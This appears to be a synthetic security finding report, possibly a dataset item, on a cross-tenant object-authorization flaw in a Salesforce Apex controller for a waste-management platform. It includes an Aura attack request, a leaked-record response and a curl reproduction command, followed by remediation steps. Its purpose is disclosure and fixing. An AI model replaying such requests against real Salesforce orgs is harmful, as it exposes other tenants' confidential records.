# Security Analysis Report
**System:** CleanRoute IoT Platform (Salesforce-Integrated)
**Domain:** Waste Management / Smart Bins
**Example ID:** SF-0092
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant cross-tenant access on `ContractController.approveContract` — attacker reads any waste management Contract record across tenant boundaries |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access on Contract Object (Pattern 1.5)

### Summary
The Apex controller `ContractController` on CleanRoute IoT Platform (`25ebd2e5.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Contract object. Per §5.0 Pattern 1.5, there is no tenant isolation predicate, enabling cross-tenant access.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getContractDetails(String contractId, ...)` while the Aura descriptor in §6.0 is `c.ContractController.approveContract`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.ContractController.approveContract`
**Affected endpoint:** `POST https://25ebd2e5.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://25ebd2e5.lightning.force.com/aura
Authorization: Bearer 00D25EBD2E5!AR25ebd2e5...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D25EBD2E5!AR25ebd2e5...

message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN",
"params":{"contractId":"001D2E5","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Contract Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001D2E5", "Name": "Victim Contract Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-64-4046"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D25EBD2E5!AR25ebd2e5..."
curl -s -X POST "https://25ebd2e5.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN","params":{"contractId":"001D2E5","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-64-4046
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class ContractController { ... }`
2. `WHERE Id = :contractId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
